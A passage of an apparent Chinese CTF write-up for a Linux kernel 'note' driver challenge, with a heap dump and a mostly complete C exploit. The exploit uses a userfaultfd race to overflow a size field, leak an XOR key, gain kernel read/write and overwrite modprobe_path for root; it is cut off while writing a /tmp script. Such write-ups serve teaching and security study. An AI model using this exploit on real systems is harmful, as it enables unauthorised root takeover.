+</span></span></code></pre></div><p>先申请一个 chunk，大小需要大于 0x10，这样才能修改下一个 chunk 的 size 字段完成进一步利用。然后在竞争线程中，申请两个 chunk，一个 size 为 0（保证溢出 0x10 个字节），另两个大小无所谓，小一点就可以了。</p><p>这样可以溢出 0x10 个字节，可以起到修改下一个 chunk 的 size 字段，我们在这里把它改大，比如申请的是 0x10 大小，把它扩大到 0x20，这样在对 idx 为 1 chunk 的进行 show 的时候就可以把异或加密密钥和 offset 都 leak 出来</p><p>在修改时第一个 8 字设置为 0，这样就不会修改 idx 为 1 的 chunk 的异或密钥，把第二个 8 字设置为 0xF0，由于异或密钥的低 12 位都为零，异或之后 0xF0 也可以直接写进去，并且 size 的类型为 int8，这样可以起到把第二个 chunk 的 size 改大的效果。</p><p>此时的堆布局应该类似于下面这个样子</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>pwndbg&gt; x/20xg 0xffffffffc0042000 + 0x2520
+</span></span><span style=display:flex><span>0xffffffffc0044520:     0xffff8eee86ac2000      0x0000000000000000
+</span></span><span style=display:flex><span>0xffffffffc0044530:     0x0000711140044538      0xffff8eee86ac2000
+</span></span><span style=display:flex><span>0xffffffffc0044540:     0xffff8eee86ac20f0      0x0000711140044550
+</span></span><span style=display:flex><span>0xffffffffc0044550:     0xffff8eee86ac2000      0xffff8eee86ac2000
+</span></span><span style=display:flex><span>0xffffffffc0044560:     0xffff8eee86ac2000      0x0000000000000010
+</span></span><span style=display:flex><span>0xffffffffc0044570:     0x0000711140044578      0xffff8eee86ac2000
+</span></span><span style=display:flex><span>0xffffffffc0044580:     0xffff8eee86ac2000      0x0000000000000000
+</span></span><span style=display:flex><span>0xffffffffc0044590:     0x0000000000000000      0x0000000000000000
+</span></span><span style=display:flex><span>0xffffffffc00445a0:     0x0000000000000000      0x0000000000000000
+</span></span><span style=display:flex><span>0xffffffffc00445b0:     0x0000000000000000      0x0000000000000000
+</span></span></code></pre></div><p>然后对 idx 为 1 的 chunk 执行 show 操作，会把 idx 为 2 的 chunk 的 size 和 offset 字段经过异或后打出来，这样就 leak 了异或密钥，进而可以算出 offset 的值。</p><p>这个时候由于修改了 idx 1 的 chunk 的 size，所以通过 chunk 1 也可以轻松地溢出，实现任意地址读写，读出、算出 global_offset_base 和 modprobe_path 后就可以以 root 权限执行任意代码了（劫持方式可以参考<a href=https://www.secpulse.com/archives/153929.html>此文</a>）。</p><p>这里 leak modprobe_path 可能比较头疼，我刚开时以为 leak 出来内核基址就可以直接算出来了，结果没想到偏移是会变的。那么只能通过代码段来 leak，我们可以通过 note_arr leak 出 note 模块的地址</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>.<span style=color:#002070;font-weight:700>text</span>:<span style=color:#40a070>000000000000006</span>C <span style=color:#40a070>140</span> E8 <span style=color:#40a070>7F</span> <span style=color:#40a070>2</span>B <span style=color:#40a070>00</span> <span style=color:#40a070>00</span>                          call    _copy_from_user ; Call Procedure
+</span></span></code></pre></div><p>然后在 note 模块被 insmod 后，这里 call 后面就会填上此处和 _copy_from_user 的偏移，读出这里的值就可以一路算出 modprobe_path 的地址了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;poll.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;pthread.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/userfaultfd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ioctl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/syscall.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/mman.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define PAGE_SIZE 0x1000
+</span></span></span><span style=display:flex><span><span style=color:#007020></span><span style=color:#902000>char</span> buf_sync_to_faultfd_page[PAGE_SIZE];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserArg</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> <span style=color:#902000>long</span> idx;
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> <span style=color:#902000>long</span> size;
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span><span style=color:#666>*</span> buf;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> note_fd;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>note_add</span>(<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> size, <span style=color:#902000>char</span><span style=color:#666>*</span> buf)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserArg</span> tmp;
+</span></span><span style=display:flex><span>    tmp.idx <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    tmp.size <span style=color:#666>=</span> size;
+</span></span><span style=display:flex><span>    tmp.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>    ioctl(note_fd, <span style=color:#40a070>0xFFFFFF00</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>note_edit</span>(<span style=color:#902000>int</span> idx, <span style=color:#902000>char</span><span style=color:#666>*</span> buf)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserArg</span> tmp;
+</span></span><span style=display:flex><span>    tmp.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>    tmp.size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    tmp.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>    ioctl(note_fd, <span style=color:#40a070>0xFFFFFF01</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>note_show</span>(<span style=color:#902000>int</span> idx, <span style=color:#902000>char</span><span style=color:#666>*</span> buf)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserArg</span> tmp;
+</span></span><span style=display:flex><span>    tmp.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>    tmp.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>    tmp.size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    ioctl(note_fd, <span style=color:#40a070>0xFFFFFF02</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>note_clear_all</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserArg</span> tmp;
+</span></span><span style=display:flex><span>    memset(<span style=color:#666>&amp;</span>tmp, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(tmp));
+</span></span><span style=display:flex><span>    ioctl(note_fd, <span style=color:#40a070>0xFFFFFF03</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>err_exit</span>(<span style=color:#902000>char</span><span style=color:#666>*</span> err_msg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[-] ERROR: %s</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, err_msg);
+</span></span><span style=display:flex><span>    exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>register_userfault</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>fault_page,<span style=color:#902000>void</span> <span style=color:#666>*</span>handler)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	pthread_t thr;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_api</span> ua;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_register</span> ur;
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint64_t</span> uffd  <span style=color:#666>=</span> syscall(__NR_userfaultfd, O_CLOEXEC <span style=color:#666>|</span> O_NONBLOCK);
+</span></span><span style=display:flex><span>	ua.api <span style=color:#666>=</span> UFFD_API;
+</span></span><span style=display:flex><span>	ua.features    <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_API, <span style=color:#666>&amp;</span>ua) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>		err_exit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_API&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	ur.range.start <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>)fault_page; <span style=color:#60a0b0;font-style:italic>//我们要监视的区域
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	ur.range.len   <span style=color:#666>=</span> PAGE_SIZE;
+</span></span><span style=display:flex><span>	ur.mode        <span style=color:#666>=</span> UFFDIO_REGISTER_MODE_MISSING;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_REGISTER, <span style=color:#666>&amp;</span>ur) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic>//注册缺页错误处理
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>        <span style=color:#60a0b0;font-style:italic>//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		err_exit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_REGISTER&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>//开一个线程，接收错误的信号，然后处理
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>int</span> s <span style=color:#666>=</span> pthread_create(<span style=color:#666>&amp;</span>thr, <span style=color:#007020>NULL</span>,handler, (<span style=color:#902000>void</span><span style=color:#666>*</span>)uffd);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (s<span style=color:#666>!=</span><span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		err_exit(<span style=color:#4070a0>&#34;[-] pthread_create&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_sleep3_edit_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler created&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
+</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
+</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler unblocked&#34;</span>);
+</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		err_exit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		err_exit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		err_exit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
+</span></span><span style=display:flex><span>    memcpy(page, buf_sync_to_faultfd_page, PAGE_SIZE);
+</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
+</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
+</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
+</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler done&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>char</span> buf_null[<span style=color:#40a070>0x200</span>], buf_content[<span style=color:#40a070>0x200</span>];  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>comp_thread</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    sleep(<span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>    puts(<span style=color:#4070a0>&#34;[+] comp start&#34;</span>);
+</span></span><span style=display:flex><span>    note_clear_all();
+</span></span><span style=display:flex><span>    note_add(<span style=color:#40a070>0</span>, buf_null);      <span style=color:#60a0b0;font-style:italic>// idx 0
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    note_add(<span style=color:#40a070>0x10</span>, buf_null);   <span style=color:#60a0b0;font-style:italic>// idx 1
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    note_add(<span style=color:#40a070>0x10</span>, buf_null);   <span style=color:#60a0b0;font-style:italic>// idx 2
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    puts(<span style=color:#4070a0>&#34;[+] comp done!&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    note_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/note&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (note_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        err_exit(<span style=color:#4070a0>&#34;open note failed!&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    note_add(<span style=color:#40a070>0x10</span>, buf_null); <span style=color:#60a0b0;font-style:italic>// idx: 0
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_sync_to_faultfd_page)[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_sync_to_faultfd_page)[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> <span style=color:#40a070>0xF0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span><span style=color:#666>*</span> sleep3_memA <span style=color:#666>=</span> mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (sleep3_memA <span style=color:#666>==</span> MAP_FAILED)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        err_exit(<span style=color:#4070a0>&#34;mmap failed!&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    register_userfault(sleep3_memA, userfaultfd_sleep3_edit_handler);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    pthread_t thr;
+</span></span><span style=display:flex><span>    pthread_create(<span style=color:#666>&amp;</span>thr, <span style=color:#007020>NULL</span>, comp_thread, <span style=color:#007020>NULL</span>);
+</span></span><span style=display:flex><span>    note_edit(<span style=color:#40a070>0</span>, sleep3_memA);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    note_show(<span style=color:#40a070>1</span>, buf_content);
+</span></span><span style=display:flex><span>    size_t xor_encrypt_key <span style=color:#666>=</span> (((size_t<span style=color:#666>*</span>)buf_content)[<span style=color:#40a070>3</span>]) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFFFFFFF000</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] xor encrypt key leaked: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, xor_encrypt_key);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    note_show(<span style=color:#40a070>2</span>, buf_content);
+</span></span><span style=display:flex><span>    size_t offset2_val <span style=color:#666>=</span> (((size_t<span style=color:#666>*</span>)buf_content)[<span style=color:#40a070>4</span>]) <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    size_t note_base_offset <span style=color:#666>=</span> offset2_val <span style=color:#666>-</span> <span style=color:#40a070>0x2578</span>;
+</span></span><span style=display:flex><span>    size_t note_arr_offset <span style=color:#666>=</span> note_base_offset <span style=color:#666>+</span> <span style=color:#40a070>0x4520</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] note arr offset leaked: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, offset2_val);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    memset(buf_content, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(buf_content));
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> <span style=color:#40a070>0x10</span>;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> note_arr_offset;
+</span></span><span style=display:flex><span>    note_edit(<span style=color:#40a070>1</span>, buf_content);
+</span></span><span style=display:flex><span>    note_show(<span style=color:#40a070>2</span>, buf_content);
+</span></span><span style=display:flex><span>    size_t note_base_addr <span style=color:#666>=</span> (((size_t<span style=color:#666>*</span>)buf_content)[<span style=color:#40a070>0</span>] <span style=color:#666>^</span> xor_encrypt_key) <span style=color:#666>-</span> <span style=color:#40a070>0x2520</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] note base addr leaked: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, note_base_addr);
+</span></span><span style=display:flex><span>    size_t page_offset_base <span style=color:#666>=</span> note_base_addr <span style=color:#666>-</span> note_base_offset;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] page_offset_base leaked: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, page_offset_base);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    memset(buf_content, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(buf_content));
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> <span style=color:#40a070>0x10</span>;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> (note_base_offset <span style=color:#666>+</span> <span style=color:#40a070>0x6C</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>    note_edit(<span style=color:#40a070>1</span>, buf_content);
+</span></span><span style=display:flex><span>    note_show(<span style=color:#40a070>2</span>, buf_content);
+</span></span><span style=display:flex><span>    size_t modprobe_path_addr <span style=color:#666>=</span> ((((((size_t<span style=color:#666>*</span>)buf_content)[<span style=color:#40a070>0</span>] <span style=color:#666>^</span> xor_encrypt_key) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF</span>) \
+</span></span><span style=display:flex><span>    <span style=color:#666>+</span> note_base_addr <span style=color:#666>+</span> <span style=color:#40a070>0x6C</span> <span style=color:#666>+</span> <span style=color:#40a070>1</span> <span style=color:#666>+</span> <span style=color:#40a070>4</span>) <span style=color:#666>+</span> (note_base_addr <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF00000000</span>) ) <span style=color:#666>+</span> <span style=color:#40a070>0xD0A260</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] modprobe_path addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, modprobe_path_addr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    size_t modprobe_path_offset <span style=color:#666>=</span> modprobe_path_addr <span style=color:#666>-</span> page_offset_base;
+</span></span><span style=display:flex><span>    memset(buf_content, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(buf_content));
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> xor_encrypt_key;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> <span style=color:#40a070>0x10</span>;
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span>) buf_content)[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> xor_encrypt_key <span style=color:#666>^</span> modprobe_path_offset;
+</span></span><span style=display:flex><span>    note_edit(<span style=color:#40a070>1</span>, buf_content);
+</span></span><span style=display:flex><span>    note_edit(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#34;/tmp/root.sh&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;mkdir -p /tmp&#34;</span>);
+</span></span><span style=display:flex><span>	system(<span style=color:#4070a0>&#34;echo &#39;#!/bin/sh&#39; &gt; /tmp/get_flag.sh&#34;</span>);
